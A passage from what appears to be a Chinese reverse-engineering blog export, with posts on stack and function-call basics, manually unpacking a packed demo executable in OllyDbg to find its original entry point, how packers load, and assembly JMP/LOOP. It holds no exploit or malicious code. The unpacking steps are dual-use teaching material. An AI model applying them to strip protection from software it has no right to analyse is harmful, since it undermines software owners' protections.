    <url>/article/58251358.html</url>
    <content><![CDATA[<h2 id="0x01简介"><a class="anchor" href="#0x01简介">#</a> 0x01 简介</h2>
<p><strong>Bug 与漏洞</strong></p>
<ul>
<li>Bug：程序在开发的过程中产生的一些功能性错误，例如：图标无法正常显示、按钮无法正常点击或点击后无响应或响应错误等；</li>
<li>漏洞：不影响你正常运行但会被利用，例如：文件读取等；</li>
</ul>
<p><strong>漏洞利用流程</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407180507407.png" alt="image-20220407180507407" /></p>
<p><strong>漏洞类型</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407181036694.png" alt="image-20220407181036694" /></p>
<p><strong>环境配置</strong></p>
<ul>
<li>Windows 7</li>
<li>Windows XP</li>
<li>Visual Studio 2008</li>
<li>VC 6.0</li>
</ul>
<h2 id="0x02函数调用基础"><a class="anchor" href="#0x02函数调用基础">#</a> 0x02 函数调用基础</h2>
<p>在 XP 系统中打开 VC 6.0 新建 win32 控制台程序项目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407194839812.png" alt="image-20220407194839812" /></p>
<p>确定后选择空项目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407194910906.png" alt="image-20220407194910906" /></p>
<p>在源文件中新建 C++ 源文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195023174.png" alt="image-20220407195023174" /></p>
<p>创建新文件后放入样例源码，然后运行测试</p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span>	<span class="token function">func_B</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg_B1<span class="token punctuation">,</span> <span class="token keyword">int</span> arg_B2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token keyword">int</span> var_B1<span class="token punctuation">,</span> var_B2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	var_B1<span class="token operator">=</span>arg_B1<span class="token operator">+</span>arg_B2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	var_B2<span class="token operator">=</span>arg_B1<span class="token operator">-</span>arg_B2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">return</span> var_B1<span class="token operator">*</span>var_B2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">int</span>	<span class="token function">func_A</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg_A1<span class="token punctuation">,</span> <span class="token keyword">int</span> arg_A2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token keyword">int</span> var_A<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	var_A <span class="token operator">=</span> <span class="token function">func_B</span><span class="token punctuation">(</span>arg_A1<span class="token punctuation">,</span>arg_A2<span class="token punctuation">)</span> <span class="token operator">+</span> arg_A1 <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">return</span> var_A<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token keyword">int</span> var_main<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	var_main<span class="token operator">=</span><span class="token function">func_A</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token keyword">return</span> var_main<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195249683.png" alt="image-20220407195249683" /></p>
<p>f10 进行调试，然后右键进入反汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195401820.png" alt="image-20220407195401820" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195430441.png" alt="image-20220407195430441" /></p>
<p>调试到 call 位置然后查看 memory</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195601255.png" alt="image-20220407195601255" /></p>
<p>查看 esp</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195639142.png" alt="image-20220407195639142" /></p>
<p>f11 跟进，进入函数查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407195737567.png" alt="image-20220407195737567" /></p>
<p>f10 调试跟踪 esp 值的变化</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407200149380.png" alt="image-20220407200149380" /></p>
<p>在将代码编译成 PE 文件后分为如下俩个区段</p>
<ul>
<li>代码段 code 可读可执行不可写</li>
<li>数据段：全局变量 可读可写</li>
</ul>
<p><strong>栈与堆的区别：</strong></p>
<ul>
<li>栈：保存变量等参数，比较小，容易被淹没</li>
<li>堆：在 C++ 中 new 出来的内存等，较大</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220407200732485.png" alt="image-20220407200732485" /></p>
]]></content>
      <categories>
        <category>二进制逆向</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制逆向：寻找OEP的两种方式</title>
    <url>/article/6f2b7bf3.html</url>
    <content><![CDATA[<h2 id="完整分析法"><a class="anchor" href="#完整分析法">#</a> 完整分析法</h2>
<p>PEID 查看基本信息</p>
<h3 id="没加壳"><a class="anchor" href="#没加壳">#</a> 没加壳</h3>
<p>入口点： <code>00001130</code></p>
<p>文件偏移： <code>00001130</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402193223884.png" alt="image-20220402193223884" /></p>
<p>EP 段： <code>.text</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402193302076.png" alt="image-20220402193302076" /></p>
<p>首字节： <code>55,8B,EC,6A</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402193332047.png" alt="image-20220402193332047" /></p>
<h3 id="加壳后"><a class="anchor" href="#加壳后">#</a> 加壳后</h3>
<p>入口点： <code>00013000</code></p>
<p>文件偏移： <code>00003E00</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402193458385.png" alt="image-20220402193458385" /></p>
<p>EP 段： <code>.pediy</code></p>
<p><code>.pediy</code>  外壳程序，入口点变为新区段的 <code>v.offset</code> （偏移）上去执行.pediy 的代码，执行完之后跳转到 <code>.text</code>  区段执行原来的入口。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402193611534.png" alt="image-20220402193611534" /></p>
<p>首字节： <code>60,E8,C2,00</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402193638334.png" alt="image-20220402193638334" /></p>
<h3 id="od分析"><a class="anchor" href="#od分析">#</a> OD 分析</h3>
<p>将加壳后的 <code>.exe文件</code> 用 OD 打开</p>
<p>执行程序后停在 <code>CALL RebPE.004130C8</code>  位置，断点记录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404190525489.png" alt="image-20220404190525489" /></p>
<p>上面的 <code>pushad</code>  起保存环境的作用，这个 <code>call</code>  起取地址的作用</p>
<p>接下来重新调试后 <code>f9</code>  跳转，然后 <code>f7</code>  跟进就是我们要分析的主模块部分了</p>
<p>上面一部分就是壳的入口点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404190809460.png" alt="image-20220404190809460" /></p>
<p>我们 <code>f8</code>  一步步往下走，在如下位置可以看到一个注释为 <code>kernek32.getprocaddress</code>  的获取函数地址的 api</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404191217216.png" alt="image-20220404191217216" /></p>
<p>在右下角栈中可以看到参数的值</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0019FF</span><span class="token number">50</span>   <span class="token number">004130</span>AB  ASCII <span class="token string">"VirtualAlloc"</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404191424089.png" alt="image-20220404191424089" /></p>
<p>此时 <code>getprocaddress</code>  返回一个值放到 <code>eax</code>  中，而在下一行中通过 <code>mov</code>  将 <code>eax</code>  的值给 <code>ebp + b8</code></p>
<p>跟进到 <code>ebp + b8</code>  部分，此时可以看到 <code>call</code>  的 <code>ebp + b8</code>  的位置存储的就是 <code>kernel32.virtualalloc</code>  的函数地址，而 <code>ebp + b8</code>  通过上面四个 <code>push</code>  可以看出它有四个参数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404191627851.png" alt="image-20220404191627851" /></p>
<p>继续往下走可以发现一个 jmp，而这个 jmp 则起到转到壳的第二个部分继续执行的作用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404192138794.png" alt="image-20220404192138794" /></p>
<p><code>f8</code>  继续执行则会进行跳转，此时跳转到的位置就是壳的第二部分的位置</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404192235465.png" alt="image-20220404192235465" /></p>
<p>如下 <code>SUB EDX,5</code>  获取外壳第二部分的基址</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00030006</span>    <span class="token number">83</span>EA <span class="token number">05</span>         SUB EDX<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr></table></figure><p>执行完可以发现 <code>edx</code>  的值发生变化，也即壳的第二部分的基地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404192431601.png" alt="image-20220404192431601" /></p>
<p>继续往下有一个 <code>je</code>  短跳，用于处理 <code>dll动态链接库</code> 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404192607628.png" alt="image-20220404192607628" /></p>
<p>继续往下走到如图所示位置进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404192925336.png" alt="image-20220404192925336" /></p>
<p>进行 <code>f8</code>  执行到 <code>CALL DWORD PTR SS:[EBP+34D]</code>  可以看到注释为 <code>KERNEL32.VirtualAlloc</code> ，而 <code>VirtualAlloc</code>  的作用则是申请内存，进行读写</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300</span>B8    FF95 <span class="token number">4</span>D030000   CALL DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">34</span>D<span class="token punctuation">]</span>              <span class="token punctuation">;</span> KERNEL32<span class="token punctuation">.</span>VirtualAlloc</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404193014416.png" alt="image-20220404193014416" /></p>
<p>获取解压区块的 <code>rva</code> ，解压完就可以看到 <code>edi</code>  中的值显示出来</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300</span>C5    <span class="token number">8</span>B78 <span class="token number">04</span>         MOV EDI<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404193318874.png" alt="image-20220404193318874" /></p>
<p>继续往下，开始解压</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404193419033.png" alt="image-20220404193419033" /></p>
<p>跟进查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404193501652.png" alt="image-20220404193501652" /></p>
<p>继续往下执行，获取原来区块大小，也即解压数据的大小</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300</span>D6    <span class="token number">8</span>B0C2B          MOV ECX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EBX<span class="token operator">+</span>EBP<span class="token punctuation">]</span></pre></td></tr></table></figure><p>继续往下即可看到 ecx 的大小，也即原来数据的大小</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404194022051.png" alt="image-20220404194022051" /></p>
<p>到此，程序已经获取到数据的大小，起始位置，rva，申请内存读写等条件</p>
<p>接下来程序开始写回去，往下 rep 重复操作，将解压后的数据写入内存</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300</span>DA    F3<span class="token operator">:</span>A4           REP MOVS BYTE PTR ES<span class="token operator">:</span><span class="token punctuation">[</span>EDI<span class="token punctuation">]</span><span class="token punctuation">,</span>BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404194419322.png" alt="image-20220404194419322" /></p>
<p>继续往下存在一个 <code>call</code> ，注释为 <code>KERNEL32.VirtualFree</code> ，释放内存，防止内存泄露</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300E6</span>    FF95 <span class="token number">5</span>D030000   CALL DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">35</span>D<span class="token punctuation">]</span>              <span class="token punctuation">;</span> KERNEL32<span class="token punctuation">.</span>VirtualFree</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404194446341.png" alt="image-20220404194446341" /></p>
<p>如此解压部分完成，而在壳的加载流程中还存在一个 <code>iat</code>  的填充</p>
<p>在 <code>000300A9</code>  位置存在一个 <code>je</code>  跳转，通过上面 <code>cmp</code>  的对比结果判断是否跳转，据此判断这个位置为 <code>iat</code>  填充</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300</span>A9   <span class="token operator">/</span><span class="token number">74</span> <span class="token number">47</span>           JE SHORT <span class="token number">000300F</span><span class="token number">2</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404195107573.png" alt="image-20220404195107573" /></p>
<p>修改 <code>je</code>  指令为 <code>jmp</code>  指令进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404195847688.png" alt="image-20220404195847688" /></p>
<p>进入 <code>iat</code>  填充部分</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404195654859.png" alt="image-20220404195654859" /></p>
<p><code>or</code>  判断 eax 是否为 0，如果值为 0 则表示导入表没有加密，否则进行过加密</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">000300F</span><span class="token number">8</span>    <span class="token number">0</span>BC0            OR EAX<span class="token punctuation">,</span>EAX</pre></td></tr></table></figure><p>jnz 跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404200116915.png" alt="image-20220404200116915" /></p>
<p>进入对转储之后的导入表初始化部分</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404200150726.png" alt="image-20220404200150726" /></p>
<p>通过 <code>jnz</code>  来回跳转对 <code>iat</code>  进行填充</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404200254011.png" alt="image-20220404200254011" /></p>
<p><code>iat</code>  填充完成后开始修复重定位</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0003018F</span>   <span class="token operator">/</span>EB <span class="token number">65</span>           JMP SHORT <span class="token number">000301F</span><span class="token number">6</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404200556817.png" alt="image-20220404200556817" /></p>
<p>反 <code>nop</code> ，跳转到 <code>00030233</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404200828315.png" alt="image-20220404200828315" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00030233</span>    <span class="token number">64</span><span class="token operator">:</span>FF35 <span class="token number">3000000</span><span class="token operator">></span>PUSH DWORD PTR FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span>                   <span class="token punctuation">;</span> teb<span class="token operator">:</span><span class="token number">0x30</span> <span class="token operator">=</span> peb</pre></td></tr></table></figure><p>判断操作系统版本</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0003023</span>D   <span class="token operator">/</span><span class="token number">78</span> <span class="token number">0F</span>           JS SHORT <span class="token number">0003024</span>E</pre></td></tr></table></figure><p>秉持着在一段结束之后跳转到下一段的原则，找到 <code>jmp</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404201143765.png" alt="image-20220404201143765" /></p>
<p>进行跳转，在这个位置会将原来入口点的 rva 取出来</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404201243179.png" alt="image-20220404201243179" /></p>
<p>断点执行，可以看到 <code>eax</code>  的值发生变化</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404201331269.png" alt="image-20220404201331269" /></p>
<p>恢复环境</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00030282</span>    <span class="token number">61</span>              POPAD</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404201638117.png" alt="image-20220404201638117" /></p>
<p><code>PUSH 401130</code> ，oep 由上面动态生成，将其吐出来之后，将它压入栈中，它即为栈顶</p>
<p>在 <code>return</code>  的时候，栈顶的数据会被弹到 <code>eip</code>  中，再通过返回值就会 <code>jmp</code>  到 <code>eip</code>  的位置，所以将其压入栈中之后 <code>return</code>  到上面 <code>push</code>  的位置上</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404202119364.png" alt="image-20220404202119364" /></p>
<p>执行 <code>retn</code> ，进入程序的真正的主程序中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404202144373.png" alt="image-20220404202144373" /></p>
<p><code>ctrl + a</code>  重新分析，进入真正的入口点，也即 <code>oep</code>  中</p>
<h2 id="堆栈平衡法"><a class="anchor" href="#堆栈平衡法">#</a> 堆栈平衡法</h2>
<p><code>f8</code>  将 8 个通用寄存器压入栈中，可以看到 <code>esp</code>  的值变为 <code>0019FF54</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404202939159.png" alt="image-20220404202939159" /></p>
<p>而有压栈就有弹栈，也即有 <code>push</code>  就有 <code>pop</code></p>
<p>也就是说在壳处理完所有数据之后就一定会将现场还原</p>
<p>而这个时候 <code>esp</code>  就还会被访问到，此时右键，将 <code>esp</code>  在数据窗口中跟随</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404203241374.png" alt="image-20220404203241374" /></p>
<p>然后在第一个数据中字节断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404203358966.png" alt="image-20220404203358966" /></p>
<p>然后 <code>f9</code> ，可以看到 <code>PUSH 401130</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404203446525.png" alt="image-20220404203446525" /></p>
<p>然后执行分析，进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404203540769.png" alt="image-20220404203540769" /></p>
<p>摸鱼结束 O (∩_∩) O</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/7EE97D3554DA364AF8E80B7FC5C164FB.gif" alt="img-7EE97D3554DA364AF8E80B7FC5C164FB" /></p>
]]></content>
      <categories>
        <category>二进制逆向</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制逆向：浅析壳与脱壳</title>
    <url>/article/40dbab9d.html</url>
    <content><![CDATA[<p>不要贴贴不要贴贴，贴贴会变密接<br />
转角不一定会遇到爱情，但可能会遇到疫情<br />
我吹过你吹过的风，这算不算相拥，算这是密接<br />
我走过你走过的路，这算不算相逢，算这是次密接</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402161318465.png" alt="image-20220402161318465" /></p>
<h2 id="壳的作用及种类"><a class="anchor" href="#壳的作用及种类">#</a> 壳的作用及种类</h2>
<p>壳能够将代码进行如下一系列操作，从而起到保护措施</p>
<ul>
<li>扭曲</li>
<li>变形</li>
<li>压缩</li>
<li>加密</li>
<li>虚拟化等</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220402154717469.png" alt="image-20220402154717469" /></p>
<h2 id="壳的加载流程"><a class="anchor" href="#壳的加载流程">#</a> 壳的加载流程</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/%E5%A3%B3%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B.png" alt="壳的加载流程" /></p>
<p><strong>保存入口参数</strong>：</p>
<p>加壳程序初始化时保存各个寄存器的值，外壳程序执行完毕，再恢复各个寄存器的值，通常用</p>
<p>pushad/popad,pushfd/popfd 指令来对保护与恢复现场环境</p>
<p><strong>获取壳自己所需要使用的 API 地址：</strong></p>
<p>一般外壳的输入表主要是 GetProcAddress，GetModuleHandle 和 LoadLibrary 这几个 API 函数</p>
<ul>
<li>LoadLibrary：将 DLL 文件映像映射到调用进程的地址空间中</li>
<li>GetModuleHandle：获得 DLL 模块的句柄</li>
<li>GetProcAddress：获得函数的地址</li>
</ul>
<p><strong>解密原程序各个区块的数据：</strong></p>
<p>按照区块加密按照区块解密</p>
<p><strong>IAT 的初始化：</strong></p>
<ul>
<li>
<p>加壳时，壳会自己构造一个输入表，并将 PE 头中的输入表指针指向自建的输入表。PE 装载器对自建的输入表进行填写，原来的输入表由壳来填写。</p>
</li>
<li>
<p>壳将新输入表结构从头到尾扫描一遍，对每一个 DLL 引入的所有函数获取地址，填入 IAT 表中</p>
</li>
</ul>
<p><strong>重定位项的处理：</strong></p>
<p>加壳的 DLL 比加壳的 EXE 修正时多一个重定位表</p>
<p><strong>HOOK-API：</strong></p>
<p>壳一般都修改了原程序的输入表，自己模仿装载器来填充输入表。在填充过程中，外壳就可以填充 HOOK-API 的代码地址，间接获得程序的控制权</p>
<p><strong>跳到程序原入口点（OEP）</strong></p>
<h2 id="判断是否加壳"><a class="anchor" href="#判断是否加壳">#</a> 判断是否加壳</h2>
<ul>
<li>peid 检测</li>
<li>ida 查看程序导入表</li>
<li>编码是否变形</li>
<li>od 提示</li>
</ul>
]]></content>
      <categories>
        <category>二进制逆向</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之JMP指令和LOOP指令学习</title>
    <url>/article/28bedc94.html</url>
    <content><![CDATA[<p>通过这篇文章带你了解汇编语言中的 <code>jmp</code>  和 <code>loop</code>  的使用，而事实上这两个东西就相当于 C 语言中的<strong>跳转</strong>和<strong>循环</strong></p>
<ul>
<li>
<p>jmp 就是无条件跳转</p>
</li>
<li>
<p>loop 就相当于 C 语言中的循环</p>
</li>
</ul>
<p>通过对它们的学习，就能解决我们分支和循环的问题。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/9c4db145dde5ebc5e29a173bdcb9d46.png" alt="image-9c4db145dde5ebc5e29a173bdcb9d46" /></p>
<h2 id="jmp学习"><a class="anchor" href="#jmp学习">#</a> JMP 学习</h2>
<p>先用一个简单的样例进行测试，观察 <code>jmp</code>  的作用</p>
<h3 id="无jmp作用的代码"><a class="anchor" href="#无jmp作用的代码">#</a> 无 jmp 作用的代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	inc eax<span class="token punctuation">;</span>inc相当于C语言中的 <span class="token operator">++</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="23"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="24"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="25"></td><td><pre>END main</pre></td></tr></table></figure><p>在经 <code>inc</code>  递增之后可以看到 eax = 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220124203209945.png" alt="image-20220124203209945" /></p>
<h3 id="有jmp作用的代码"><a class="anchor" href="#有jmp作用的代码">#</a> 有 jmp 作用的代码</h3>
<p>添加 jmp 作用之后，再观察 jmp 的作用效果</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token 